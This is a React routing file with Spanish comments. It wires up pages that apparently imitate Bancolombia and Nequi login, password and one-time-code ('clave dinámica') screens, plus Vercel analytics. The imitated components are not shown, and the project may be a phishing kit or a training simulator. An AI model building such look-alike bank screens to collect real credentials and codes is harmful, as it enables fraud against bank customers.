import { BrowserRouter as Router, Routes, Route } from "react-router-dom"
import MainApp from "./MainApp"
import BancolombiaSim from "./components/BancolombiaSims/BancolombiaSim"
import "./App.css"
import PasswordForm from "./components/PasswordForm/PasswordForm"
import ClaveDinamica from "./components/ClaveDinamica/ClaveDinamica"
import NequiClaveDinamica from "./components/NequiClaveDinamica/NequiClaveDinamica"
import NequiLogin from "./components/NequiLogin/NequiLogin"
import { Analytics } from "@vercel/analytics/react"   // ✅ este es el correcto

function App() {
  return (
    <>
      <Router>
        <Routes>
          {/* Pantalla principal */}
          <Route path="/" element={<MainApp />} />
          <Route path="/bancolombia" element={<BancolombiaSim />} />
          <Route path="/clave" element={<PasswordForm />} />
          <Route path="/clave-dinamica" element={<ClaveDinamica />} />
          <Route path="/nequi" element={<NequiLogin />} />
          <Route path="/nequi/clave-dinamica" element={<NequiClaveDinamica />} />
        </Routes>
      </Router>

      {/* Analytics de Vercel */}
      <Analytics />
    </>
  )
}

export default App
